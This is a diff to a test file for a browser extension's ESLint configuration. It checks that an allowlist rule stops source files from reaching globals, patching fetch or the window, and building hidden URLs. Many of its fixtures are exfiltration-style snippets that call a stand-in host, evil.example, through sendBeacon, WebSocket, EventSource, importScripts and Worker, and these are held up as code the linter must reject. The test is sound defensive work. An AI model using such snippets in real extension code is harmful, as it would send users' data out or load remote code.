@@ -1,6 +1,8 @@
 import { ESLint, Linter } from 'eslint';
+import { join } from 'node:path';
 import tseslint from 'typescript-eslint';
 import { describe, expect, it } from 'vitest';
+import { fontsnapPlugin } from '../../eslint.config.js';
 
 // What guards.test.ts cannot show: that the selectors in eslint.config.js really match the code
 // they are meant to stop. The config itself (rules and options) is pinned by the guard snapshots.
@@ -20,9 +22,18 @@ async function flagged(file: string, code: string): Promise<string[]> {
     }),
   );
   expect(Object.keys(rules), `${file} has restriction rules`).not.toEqual([]);
-  const messages = new Linter().verify(code, [
-    { languageOptions: { parser: tseslint.parser }, rules },
-  ]);
+  const messages = new Linter().verify(
+    code,
+    [
+      {
+        files: ['**/*.ts'],
+        languageOptions: { parser: tseslint.parser },
+        plugins: { fontsnap: fontsnapPlugin },
+        rules,
+      },
+    ],
+    join(process.cwd(), file),
+  );
   return messages.map((message) => message.message);
 }
 
@@ -455,7 +466,6 @@ describe('extension code does not tamper with globals, host objects or prototype
     "if (Object.hasOwn(o, 'k')) run();",
     'const p = Promise.resolve(1);',
     'class Box { value = 1; }',
-    "const flags = win as unknown as Record<string, unknown>; flags['k'] = true;",
     'const f = (x: string) => x.prototypeless;',
   ])('lets ordinary code through: %s', async (code) => {
     for (const file of ['src/result/app.ts', 'src/result/model.ts', 'src/select/overlay.ts']) {
@@ -471,5 +481,320 @@ describe('extension code does not tamper with globals, host objects or prototype
     expect(await flagged('src/result/model.ts', 'ort.env.wasm.wasmPaths = runtimeUrl();')).toEqual(
       [],
     );
+  });
+});
+
+// Round 3 of the review of PR #6: denying the spellings that reach or write the global object was a list that was completed
+// three times (Object.assign(document.defaultView, { fetch }), top, parent, ...). src/ now reaches the environment through an
+// ALLOWLIST (GLOBAL_ACCESS in eslint.config.js): a global that is not named there cannot be used, a restricted one only through
+// its listed members, and never written, aliased, destructured, computed or passed on.
+describe('src/ reaches the environment only through the allowlist of globals', () => {
+  // the names the fixtures use freely; they are declared, so that only real globals are "global" for the rule
+  const FREE_NAMES = `declare let ${[
+    'Other',
+    'blob',
+    'css',
+    'data',
+    'd',
+    'doc',
+    'el',
+    'event',
+    'frame',
+    'handler',
+    'iframe',
+    'key',
+    'name',
+    'node',
+    'o',
+    'other',
+    'patched',
+    'render',
+    'rows',
+    's',
+    'sender',
+    'stop',
+    'tab',
+    'target',
+    'text',
+    'u',
+    'url',
+    'use',
+    'v',
+    'w',
+    'x',
+    'y',
+    'run',
+    'b',
+    'evil',
+    'startSelection',
+  ].join(', ')}: any;`;
+  /** Messages of the allowlist rule alone, for `code` as if it were the file `file` (the DOM types are known). */
+  async function reached(file: string, code: string): Promise<string[]> {
+    const config = (await eslint.calculateConfigForFile(file)) as {
+      rules?: Record<string, Linter.RuleEntry>;
+    };
+    const entry = config.rules?.['fontsnap/global-access'];
+    expect(entry, `${file} is held to the allowlist`).toBeDefined();
+    return new Linter()
+      .verify(
+        `${FREE_NAMES}\n${code}`,
+        [
+          {
+            files: ['**/*.ts'],
+            languageOptions: {
+              parser: tseslint.parser,
+              parserOptions: { lib: ['esnext', 'dom', 'dom.iterable'] },
+            },
+            plugins: { fontsnap: fontsnapPlugin },
+            rules: { 'fontsnap/global-access': entry ?? 'off' },
+          },
+        ],
+        join(process.cwd(), file),
+      )
+      .map((message) => message.message);
+  }
+  /** Both rules: the allowlist and the restrictions on properties that hand over a Window. */
+  async function either(file: string, code: string): Promise<string[]> {
+    return [...(await reached(file, code)), ...(await flagged(file, code))];
+  }
+
+  const FILES = [
+    'src/result/render.ts',
+    'src/result/index.ts',
+    'src/background/handlers.ts',
+    'src/shared/capture.ts',
+    'src/shared/ui.ts',
+    'src/welcome/mode.ts',
+    'src/select/overlay.ts',
+    'src/result/model.ts',
+  ];
+
+  it.each([
+    // the window through an alias or a property (C1 of the review)
+    ['document.defaultView in Object.assign', 'Object.assign(document.defaultView, { fetch });'],
+    ['top', 'Object.assign(top as object, { fetch });'],
+    ['parent', 'Object.assign(parent as object, { fetch });'],
+    ['frames', 'Object.assign(frames[0] as object, { fetch });'],
+    ['opener', 'const o = opener;'],
+    ['frameElement', 'const f = frameElement;'],
+    ['globalThis.self', 'const w = globalThis.self;'],
+    ['window.window', 'const w = window.window;'],
+    ['an alias of defaultView', 'const w = document.defaultView; w.fetch = patched;'],
+    ['a destructured defaultView', 'const { defaultView } = document;'],
+    ['a destructured fetch', 'const { fetch } = globalThis;'],
+    ['a renamed destructured defaultView', 'const { defaultView: w } = document;'],
+    ['a computed defaultView', "const w = document['defaultView'];"],
+    ['a template defaultView', 'const w = document[`defaultView`];'],
+    ['ownerDocument.defaultView', 'const w = node.ownerDocument.defaultView;'],
+    ['Reflect.set on an alias', "Reflect.set(document.defaultView as object, 'fetch', patched);"],
+    ['defineProperty on a frame', "Object.defineProperty(frame.contentWindow, 'fetch', d);"],
+    ['setPrototypeOf on an alias', 'Object.setPrototypeOf(w, evil);'],
+    ['iframe.contentWindow', 'const w = iframe.contentWindow;'],
+    ['MessageEvent.source', 'const w = event.source;'],
+    ['UIEvent.view', 'const w = event.view;'],
+    ['event.currentTarget', 'const w = event.currentTarget;'],
+    ['event.relatedTarget', 'const w = event.relatedTarget;'],
+    ['composedPath', 'const path = event.composedPath();'],
+    ['event.target read', 'const t = event.target;'],
+    ['event.target destructured', 'const { target } = event;'],
+    ['getBackgroundPage', 'const w = await chrome.runtime.getBackgroundPage();'],
+    ['extension getViews', 'const ws = chrome.extension.getViews();'],
+    ['the Window type', 'function f(w: Window) { return w; }'],
+    ['typeof globalThis', 'function f(w: typeof globalThis) { return w; }'],
+    ['a message source type', 'function f(w: MessageEventSource) { return w; }'],
+    ['Object.assign on anything but a style', 'Object.assign(target, { a: 1 });'],
+    // resource timing (C2 of the review)
+    ['setResourceTimingBufferSize', 'performance.setResourceTimingBufferSize(0);'],
+    ['clearResourceTimings', 'performance.clearResourceTimings();'],
+    ['performance.mark', "performance.mark('x');"],
+    ['performance.now', 'const t = performance.now();'],
+    ['an alias of performance', 'const p = performance;'],
+    // ways to build or hide a URL, and to leave the page's own fetch
+    ['atob', "const u = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUv');"],
+    ['btoa', "const b = btoa('x');"],
+    ['decodeURI', "const u = decodeURI('%68ttps://evil.example/');"],
+    ['decodeURIComponent', "const u = decodeURIComponent('%68ttps://evil.example/');"],
+    ['unescape', "const u = unescape('%68ttps://evil.example/');"],
+    ['String.fromCharCode', 'const c = String.fromCharCode(104, 116, 116, 112);'],
+    ['String.fromCodePoint', 'const c = String.fromCodePoint(104);'],
+    ['String.raw', 'const c = String.raw`a`;'],
+    ['TextDecoder', 'const d = new TextDecoder();'],
+    ['Worker', "const w = new Worker('https://evil.example/w.js');"],
+    ['SharedWorker', "const w = new SharedWorker('w.js');"],
+    ['importScripts', "importScripts('https://evil.example/x.js');"],
+    ['XMLHttpRequest', 'const x = new XMLHttpRequest();'],
+    ['EventSource', "const e = new EventSource('https://evil.example/');"],
+    ['WebSocket', "const w = new WebSocket('wss://evil.example/');"],
+    ['sendBeacon', "navigator.sendBeacon('https://evil.example/', data);"],
+    ['navigator.webdriver', 'if (navigator.webdriver) run();'],
+    ['navigator.serviceWorker', 'const sw = navigator.serviceWorker;'],
+    ['queueMicrotask', 'queueMicrotask(run);'],
+    ['WebAssembly', 'const w = WebAssembly;'],
+    ['Reflect', 'const r = Reflect;'],
+    ['Proxy', 'const p = new Proxy({}, {});'],
+    ['JSON', 'const o = JSON.parse(text);'],
+    ['Intl', 'const f = new Intl.NumberFormat();'],
+    ['crypto', 'const id = crypto.randomUUID();'],
+    ['location', 'const h = location.href;'],
+    ['localStorage', "localStorage.setItem('a', 'b');"],
+    // chrome: only the listed members
+    ['an alias of chrome', 'const c = chrome;'],
+    ['a destructured chrome', 'const { runtime } = chrome;'],
+    ['chrome passed on', 'use(chrome);'],
+    ['a computed chrome member', 'const g = chrome[name];'],
+    ['chrome.runtime alone', 'const r = chrome.runtime;'],
+    ['chrome.runtime.connect', 'chrome.runtime.connect();'],
+    ['chrome.runtime.getURL alone as a value', 'const g = chrome.runtime;'],
+    ['chrome.webRequest', 'chrome.webRequest.onBeforeRequest.addListener(f, {});'],
+    ['chrome.storage.local', 'await chrome.storage.local.get();'],
+    ['chrome.declarativeNetRequest', 'chrome.declarativeNetRequest.updateDynamicRules({});'],
+    ['chrome.debugger', 'chrome.debugger.attach({}, "1.3");'],
+    // writes to what is allowed
+    ['a write to chrome.runtime.getURL', "chrome.runtime.getURL = () => 'https://evil.example/';"],
+    ['a write to Math', 'Math.max = patched;'],
+    ['a write to Object', 'Object.hasOwn = patched;'],
+    ['a write to Promise', 'Promise.resolve = patched;'],
+    ['a write to document', "document.title = 'x'; document.body = other;"],
+    ['a write to navigator', 'navigator.hardwareConcurrency = 1;'],
+    ['an update of an allowed global', 'Date.now++;'],
+    ['a delete', 'delete Array.isArray;'],
+    ['a destructuring write', '({ a: Math.max } = o);'],
+    ['an assignment to a bare global', 'Map = Other;'],
+  ])('rejects %s', async (_name, code) => {
+    // not shared/capture.ts: it is the one file with decodeURIComponent and globalThis.crypto
+    for (const file of FILES.filter((name) => name !== 'src/shared/capture.ts').slice(0, 4)) {
+      expect(await either(file, code), `${file}: ${code}`).not.toEqual([]);
+    }
+  });
+
+  it.each([
+    "const url = chrome.runtime.getURL('x'); const id = chrome.runtime.id;",
+    'chrome.runtime.onMessage.addListener(handler); chrome.runtime.onInstalled.addListener(handler);',
+    'await chrome.storage.session.set({ a: 1 }); await chrome.storage.session.remove("a");',
+    'await chrome.tabs.captureVisibleTab({ format: "png" });',
+    'chrome.action.onClicked.addListener(handler); await chrome.action.getUserSettings();',
+    'chrome.contextMenus.removeAll(); chrome.contextMenus.create({ id: "a" });',
+    'const text = chrome.i18n.getMessage(key); const lang = chrome.i18n.getUILanguage();',
+    "await chrome.scripting.executeScript({ target: { tabId: 1 }, files: ['select.js'] });",
+    "const g = chrome['runtime'].getURL('x');",
+    'const t: chrome.tabs.Tab | undefined = tab; const s: chrome.runtime.MessageSender = sender;',
+    'const n = Math.min(1, 2) + Number(x) + Number.isFinite(y) + Date.now();',
+    'const a = Array.isArray(v) ? new Map<string, number>() : new Set<string>();',
+    'const e = new Error(String(v)); const r = new RangeError("x");',
+    'const f = new Float32Array(2); const u = new Uint8ClampedArray(2); const i = new Int32Array(1);',
+    "if (Object.hasOwn(o, 'k')) run(Object.entries(o));",
+    'const el = document.createElement("div"); document.body.append(el); el.textContent = text;',
+    'await navigator.clipboard.writeText(css); const n = navigator.hardwareConcurrency || 1;',
+    'const p = new Promise<void>((resolve) => setTimeout(resolve, 0)); requestAnimationFrame(run);',
+    'const timer = setInterval(run, 1500); clearInterval(timer);',
+    'const bmp = await createImageBitmap(blob); const c = new OffscreenCanvas(1, 1);',
+    'const q = new URLSearchParams(s); const e = encodeURIComponent(x);',
+    'const w = NodeFilter.SHOW_TEXT; const n = NaN + Infinity;',
+    'const copy = new Uint8Array(b); const same = x === undefined;',
+  ])('lets what src/ really does through: %s', async (code) => {
+    for (const file of FILES.slice(0, 4)) {
+      expect(await reached(file, code), `${file}: ${code}`).toEqual([]);
+    }
+  });
+
+  it('gives each file only the extra names it needs', async () => {
+    // content script of the selection overlay: its own Window
+    expect(await either('src/select/index.ts', 'startSelection(window);')).toEqual([]);
+    expect(await reached('src/result/render.ts', 'startSelection(window);')).not.toEqual([]);
+    expect(
+      await reached('src/select/overlay.ts', 'function f(win: Window) { return win; }'),
+    ).toEqual([]);
+    expect(
+      await reached('src/result/app.ts', 'function f(win: Window) { return win; }'),
+    ).not.toEqual([]);
+    expect(
+      await reached('src/select/overlay.ts', "Object.assign(el.style, { left: '1px' });"),
+    ).toEqual([]);
+    // the screenshot of the service worker
+    expect(
+      await reached('src/background/shot.ts', 'const ratio = window.devicePixelRatio || 1;'),
+    ).toEqual([]);
+    expect(await reached('src/background/shot.ts', 'const w = window.document;')).not.toEqual([]);
+    expect(
+      await reached('src/background/shot.ts', "const b = btoa('x') + String.fromCharCode(1);"),
+    ).toEqual([]);
+    expect(
+      await reached('src/background/shot.ts', "await fetch(url, { credentials: 'omit' });"),
+    ).toEqual([]);
+    expect(
+      await reached('src/result/render.ts', "await fetch('https://evil.example/');"),
+    ).not.toEqual([]);
+    expect(await reached('src/shared/ui.ts', 'await fetch(url);')).not.toEqual([]);
+    // the shared capture codec
+    expect(await reached('src/shared/capture.ts', 'const c = globalThis.crypto;')).toEqual([]);
+    expect(await reached('src/shared/capture.ts', 'const c = globalThis.fetch;')).not.toEqual([]);
+    expect(await reached('src/result/render.ts', 'const c = globalThis.crypto;')).not.toEqual([]);
+    expect(await reached('src/shared/capture.ts', 'const m = decodeURIComponent(s);')).toEqual([]);
+    expect(await reached('src/result/render.ts', 'const m = decodeURIComponent(s);')).not.toEqual(
+      [],
+    );
+    // the runtime: one performance read, the descriptor read, the thread count
+    const model =
+      'const isolated = globalThis.crossOriginIsolated; const e = performance.getEntriesByType("resource"); ' +
+      "const d = Object.getOwnPropertyDescriptor(o, 'x'); const r = await fetch(u);";
+    expect(await reached('src/result/model.ts', model)).toEqual([]);
+    expect(await reached('src/result/app.ts', model)).not.toEqual([]);
+    expect(await reached('src/result/model.ts', 'performance.clearResourceTimings();')).not.toEqual(
+      [],
+    );
+    expect(
+      await reached('src/result/model.ts', 'performance.setResourceTimingBufferSize(0);'),
+    ).not.toEqual([]);
+    // the welcome page detects a Chrome event
+    expect(await reached('src/welcome/app.ts', "const has = 'x' in chrome.action;")).toEqual([]);
+    expect(await reached('src/result/app.ts', "const has = 'x' in chrome.action;")).not.toEqual([]);
+  });
+
+  it('is shadow-aware: a local variable that shares the name of a global is not the global', async () => {
+    expect(
+      await reached(
+        'src/result/render.ts',
+        'function f(top: number, parent: string) { const self = top + 1; return [top, parent, self]; }',
+      ),
+    ).toEqual([]);
+    expect(
+      await reached('src/result/render.ts', 'const top = rows.slice(0, 5); use(top);'),
+    ).toEqual([]);
+  });
+
+  describe('the two pages that listen to their window', () => {
+    const PAGES = ['src/result/app.ts', 'src/welcome/app.ts'];
+    it('hold it in `win` and use it for win.location and win.addEventListener only', async () => {
+      const ok =
+        'const win = doc.defaultView; if (!win) return; const h = win.location.hash; ' +
+        "win.addEventListener('hashchange', render); win.addEventListener('pagehide', stop);";
+      for (const file of PAGES) expect(await flagged(file, ok), file).toEqual([]);
+    });
+
+    it.each([
+      ['another name', 'const w = doc.defaultView;'],
+      [
+        'an object to assign to',
+        'const win = doc.defaultView; Object.assign(win, { fetch: patched });',
+      ],
+      ['win passed on', 'const win = doc.defaultView; use(win);'],
+      ['win.fetch', 'const win = doc.defaultView; win.fetch = patched;'],
+      ['win.top', 'const win = doc.defaultView; const t = win.top;'],
+      ['win.document', 'const win = doc.defaultView; const d = win.document;'],
+      ['a computed member', "const win = doc.defaultView; win['fetch'] = patched;"],
+      ['an alias', 'const win = doc.defaultView; const w = win;'],
+      ['a second source', 'const win = doc.defaultView; const x = frame.contentWindow;'],
+      ['a destructured defaultView', 'const { defaultView: win } = doc;'],
+      ['a computed defaultView', "const win = doc['defaultView'];"],
+    ])('refuse %s', async (_what, code) => {
+      for (const file of PAGES)
+        expect(await flagged(file, code), `${file}: ${code}`).not.toEqual([]);
+    });
+
+    it('is not allowed anywhere else', async () => {
+      expect(
+        await flagged('src/result/render.ts', 'const win = doc.defaultView; win.location.hash;'),
+      ).not.toEqual([]);
+    });
   });
 });
